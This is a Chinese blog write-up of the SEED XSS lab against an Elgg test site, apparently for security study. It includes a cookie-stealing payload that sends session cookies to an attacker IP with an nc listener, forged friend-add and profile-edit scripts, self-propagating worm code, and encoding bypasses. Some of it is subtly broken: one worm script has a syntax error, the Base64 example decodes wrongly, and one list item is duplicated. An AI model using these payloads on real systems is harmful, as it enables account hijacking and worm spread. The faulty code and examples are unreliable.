

# lab setup

参考seed系列其他博客

# Task 1: Posting a Malicious Message to Display an Alert Window

通过在个人主页汇总嵌入JavaScript 程序，这样当其他用户查看个人主页时，将执行 JavaScript 程序并显示一个警告窗口

- 在brief description框中填入`<script>alert('XSS');</script>`

如果想运行一个很长的 JavaScript，但是受到表单中可键入字符数量的限制，可以将 JavaScript 程序存储在一个独立js文件中，然后使用 < script > 标记中的 src 属性引用它

```javascript
<script type="text/javascript"
    src="http://www.example.com/myscripts.js">
</script>
```

# Task 2: Posting a Malicious Message to Display Cookies

当其他用户查看个人主页时，用户的 cookie 将显示在警告窗口中:`<script>alert(document.cookie);</script>`

# Task 3: Stealing Cookies from the Victim’s Machine

攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：

```java
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>'); </script>
```

当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求，上面的 JavaScript 将 cookie 发送到攻击者ip的端口5555(IP 地址为10.9.0.1) ，在那里攻击者有一个 TCP 服务器监听相同的端口

攻击者机器运行：

```shell
nc -lknv 5555
```

- -l Listen on a specified port and print any data received
- -v Produce more verbose output.
- -n 直接使用IP地址，而不通过域名服务器
- -k 当一个连接完成时，监听另一个连接

攻击者shell：

```shell
$ nc -lknv 5555
Listening on 0.0.0.0 5555
Connection received on 10.0.2.15 58018
GET /?c=Elgg%3D8fueaeqm5p111ufasemhhpep6n%3B%20elggperm%3Dzv6b-6-jXGHCHP6e8DaQqjlkyRIW883S HTTP/1.1
Host: 10.9.0.1:5555
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://www.seed-server.com/profile/alice
```

# Task 4: Becoming the Victim’s Friend

编写一个 XSS 蠕虫，将 Samy 作为访问 Samy 页面的任何其他用户的朋友,这个蠕虫不会自我传播

先用http live header抓一下加/删好友的包：


```
GET	http://www.seed-server.com/action/friends/add?friend=56&__elgg_ts=1665136694,1665136694&__elgg_token=fd9a9_Ls7UPwUtwEuzLjCg,fd9a9_Ls7UPwUtwEuzLjCg

GET	http://www.seed-server.com/action/friends/remove?friend=56&__elgg_ts=1665136694,1665136694&__elgg_token=fd9a9_Ls7UPwUtwEuzLjCg,fd9a9_Ls7UPwUtwEuzLjCg
```

根据上面请求依葫芦画瓢组织一下sendurl(注意一下url里面的friend和friends)

```java
<script type="text/javascript">
    window.onload = function () {
        var Ajax=null;
        
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        
        var sendurl="http://www.seed-server.com/action/friends/add?friend=56" + ts + token;
        
        Ajax=new XMLHttpRequest();
        Ajax.open("GET", sendurl, true);
        Ajax.send();
    }
</script>
```

Question 1: Explain the purpose of Lines ¿and ¡, why are they are needed?（ts、token）

是用作针对CSRF的安全措施的值，每次加载页面时它们都会更改，这里动态获取使用token实现认证

Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?

不能。编辑器模式添加了额外的 HTML 并更改了一些符号，比如`<p>`

# Task 5: Modifying the Victim’s Profile

要求修改受害者的“about me”字段

抓包，先看一下修改“about me”字段对应的post请求content字段中的内容：

```
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="__elgg_token"

B4kETnpwfAY-9_DqgFrU3Q
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="__elgg_ts"

1665148744
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="name"

Boby
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="description"

<p>wndmd nmsl hhhhh</p>

-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="accesslevel[description]"

0
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="briefdescription"

???????????!!!!!!!!!!!!!!
-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="accesslevel[briefdescription]"

2

-----------------------------29413027072745719142433280896
Content-Disposition: form-data; name="guid"

57

```

按照上面字段填充代码，主要问题在于content字符串的构造

```java
<script type="text/javascript">
    window.onload = function(){
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        
        var content=token + ts + userName +
            "&description=IamAlice&accesslevel[description]=2" + guid;
        var samyGuid=56;
        var sendurl="http://www.seed-server.com/action/profile/edit";
        
        if(elgg.session.user.guid!=samyGuid)
        {
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type",
                                  "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
```

以html形式输入到Alice的“about me”中，每一个看到Alice的主页的人的“about me”都会被修改

Question 3: Why do we need Line ? Remove this line, and repeat your attack. Report and explainyour observation.

防止Alice自己的“about me”被修改



```javascript
<script type="text/javascript" id=worm>
    window.onload = function(){
        var name="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="__elgg_token="+elgg.security.token.__elgg_token;
    
        var description = "&description=<p>Your profile have been attacked!!!<\/p>"}
        var scriptstr = "<script type=\"text\/javascript\" id=worm>" + document.getElementById("worm").innerHTML + "<\/script>";
    
        var content=token + ts + description + encodeURIComponent(scriptstr) + guid + name;
    
        Ajax=new XMLHttpRequest();
        Ajax.open("POST","/action/profile/edit",true);
        Ajax.setRequestHeader("Host","www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
</script>
//引用自https://blog.csdn.net/qq_39678161/article/details/119908242
<script id="worm">
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
    window.onload = function(){
        var userName="&name="+elgg.session.user.name;
        var guid="&guid="+elgg.session.user.guid;
        var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
        var token="&__elgg_token="+elgg.security.token.__elgg_token;
        
        var content=token + ts + userName +
            "&description=" + wormCode + "&accesslevel[description]=2" + 
            "&briefdescription=samy%20is%20my%20hero&accesslevel[briefdescription]=2" +
            guid;
        var samyGuid=59;
        var sendurl="http://www.seed-server.com/action/profile/edit";
        
        if(elgg.session.user.guid!=samyGuid)
        {
            var Ajax=null;
            Ajax=new XMLHttpRequest();
            Ajax.open("POST", sendurl, true);
            Ajax.setRequestHeader("Content-Type",
                                  "application/x-www-form-urlencoded");
            Ajax.send(content);
        }
    }
</script>
//引用自https://blog.csdn.net/l4kjih3gfe2dcba1/article/details/118768821
```

# 后记

## 原理

```
<script type="text/javascript"
    src="http://www.example.com/myscripts.js">
</script>
```

可以在myscripts.js中插入恶意代码，例如：

```
alert('恶意代码已执行！');
```

当用户访问包含上述代码的网页时，恶意代码将被执行，弹出一个警告框

如果攻击者希望通过 JavaScript 代码将 cookie 发送给自己，可以如下构造js代码：

```java
<script>document.write('<img src=http://10.9.0.1:5555?c=' + escape(document.cookie) + '>'); </script>
```

当 JavaScript 插入 img 标记时，浏览器尝试从 src 字段中的 URL 加载图像; 这导致向攻击者的机器发送 HTTP GET 请求

## 类型

XSS攻击可以分为以下几种类型：

1. 存储型XSS攻击，又称持久型XSS：攻击者将恶意脚本代码存储在Web应用程序的数据库中，当用户访问包含该恶意代码的页面时，恶意代码会被执行。
2. 反射型XSS攻击，又称非持久型XSS：攻击者将恶意脚本代码作为参数发送给Web应用程序，Web应用程序将该参数反射回给用户，从而执行恶意代码。
3. DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。

## 绕过

1. HTML编码绕过：攻击者通过对恶意脚本代码进行HTML编码，从而绕过应用程序的过滤和验证。
2. JavaScript编码绕过：攻击者通过对恶意脚本代码进行JavaScript编码，从而绕过应用程序的过滤和验证。
3. DOM型XSS攻击：攻击者通过修改网页的DOM结构，将恶意脚本代码注入到网页中，从而实现攻击。

### 编码绕过

1. Unicode编码：攻击者通过对恶意脚本代码进行Unicode编码，从而绕过应用程序的过滤和验证。例如，将`<script>alert('XSS')</script>`编码为`\u003Cscript\u003Ealert('XSS')\u003C/script\u003E`。
2. Base64编码：攻击者通过对恶意脚本代码进行Base64编码，从而绕过应用程序的过滤和验证。例如，将`<script>alert('XSS')</script>`编码为`PHNjcmlwdD5hbGVydCgnWFMnKTwvc2NyaXB0Pg==`。
3. 十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将`<script>alert('XSS')</script>`编码为`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`。
4. 双重编码：攻击者通过对恶意脚本代码进行双重HTML编码，从而绕过应用程序的过滤和验证。例如，将`<script>alert('XSS')</script>`编码为`%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E`。
5. 十六进制编码：攻击者通过对恶意脚本代码进行十六进制编码，从而绕过应用程序的过滤和验证。例如，将`<script>alert('XSS')</script>`编码为`%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`。

## 防护

- 使用HTTPOnly Cookie。HTTPOnly Cookie只能通过HTTP协议传输，无法通过JavaScript等脚本语言访问，从而防止恶意脚本代码访问Cookie。这样，即使恶意脚本代码能够注入到网页中，也无法窃取用户的会话信息